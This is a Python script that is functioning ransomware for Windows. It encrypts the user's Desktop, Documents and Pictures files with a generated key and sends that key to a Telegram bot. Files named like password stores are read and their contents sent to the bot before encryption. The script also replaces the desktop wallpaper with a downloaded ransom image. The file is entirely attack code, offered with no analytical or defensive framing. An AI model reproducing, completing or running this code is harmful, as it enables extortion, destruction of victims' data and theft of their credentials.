import os
from typing import List, Any
from cryptography.fernet import Fernet
import requests
import re
import ctypes

TARGET_EMAIL: str = ""
TELEGRAM_TOKEN: str = ""
TELEGRAM_MSG_ID: str = ""
TELEGRAM_UPDATES: str = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/getUpdates"
TELEGRAM_CHANNEL: str = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage?chat_id={str(TELEGRAM_MSG_ID)}&text="

USER_ENV: str = os.environ["USERPROFILE"]
PATH_TO_FOLDER_DESKTOP: str = os.path.join(USER_ENV,"Desktop")
PATH_TO_FOLDER_DOCUMENTS: str = os.path.join(USER_ENV,"Documents")
PATH_TO_FOLDER_PICTURES: str = os.path.join(USER_ENV,"Pictures")
PATH_TO_BACKGROUND_IMAGE_URL: str = ""
PATH_TO_BACKGROUND_IMAGE_LOCAL: str = os.path.join(PATH_TO_FOLDER_DESKTOP,"ransom_background.png")

PASSWORDS_PATTERN: str = r"password|pwd"

SYS_SETDESKWALLPAPER: int = 20
SYS_UPDATEINIFILE: hex = 0x01
SYS_SENDWININICHANGE: hex = 0x02

PATH_TO_FOLDERS: List[str] = [
    PATH_TO_FOLDER_DESKTOP,
    PATH_TO_FOLDER_DOCUMENTS,
    PATH_TO_FOLDER_PICTURES
    ]
FILE_EXTENSIONS: List[str] = [
    "txt",
    "png",
    "jpg",
    "jpeg",
    "pdf",
    "docx",
    "xlsx",
    "csv"
    ]

def openFile(path_to_file: str) -> bytes:
    with open(path_to_file,"rb") as file_to_open:
        result: str = file_to_open.read()
    return result

def saveToFile(path_to_file: str, data: bytes) -> None:
    with open(path_to_file, "wb") as file_to_save:
        file_to_save.write(data)

def generateKey() -> str:
    temp_key: Any = Fernet.generate_key()
    result: str = temp_key.decode(encoding="utf-8")
    return result

def setBackgroundImage(path_to_url: str, path_to_local: str, val_set: int, val_ini: hex, val_send: hex) -> None:
    image_to_retrieve: Any = requests.get(path_to_url).content
    saveToFile(path_to_local,image_to_retrieve)
    (
        ctypes
        .windll
        .user32
        .SystemParametersInfoW(
            val_set,
            0,
            path_to_local,
            val_ini | val_send
        )
    )

def sendToBot(path_to_bot: str, message: str) -> None:
    message_as_string: str = (
       message
        .replace(" ","_")
    )
    message_to_bot: str = path_to_bot + message_as_string
    requests.get(message_to_bot).json()

def listFiles(path_to_folders: str, extensions: List[str]) -> List[str]:
    result: List[str] = []
    for folder in path_to_folders:
        for root,_,files in os.walk(folder):
            for f in files:
                if f.split(".")[-1] in extensions:
                    full_path: str = os.path.join(root,f)
                    result.append(full_path)
    return result

def encryptFile(path_to_file: str, encryption_key: str) -> None:
    fernet = Fernet(encryption_key)
    file_as_string: bytes = openFile(path_to_file)
    try:
        file_encrypted: Any = fernet.encrypt(file_as_string)
        saveToFile(path_to_file,file_encrypted)
    except:
        pass

def runAll() -> None:
    unique_key: str = generateKey()
    sendToBot(TELEGRAM_CHANNEL,rf"Email:{TARGET_EMAIL}")
    sendToBot(TELEGRAM_CHANNEL,rf"Key:{unique_key}")
    files_to_encrypt: List[str] = listFiles(PATH_TO_FOLDERS,FILE_EXTENSIONS)
    for file_to_encrypt in files_to_encrypt:
        if re.search(PASSWORDS_PATTERN,file_to_encrypt,flags=re.IGNORECASE):
            stolen_passwords: str = openFile(file_to_encrypt)
            sendToBot(TELEGRAM_CHANNEL,stolen_passwords)
            encryptFile(file_to_encrypt, unique_key)
        else:
            print(file_to_encrypt)
            encryptFile(file_to_encrypt, unique_key)
    setBackgroundImage(
        PATH_TO_BACKGROUND_IMAGE_URL,
        PATH_TO_BACKGROUND_IMAGE_LOCAL,
        SYS_SETDESKWALLPAPER,
        SYS_UPDATEINIFILE,
        SYS_SENDWININICHANGE
        )

if __name__ == "__main__":
    runAll()
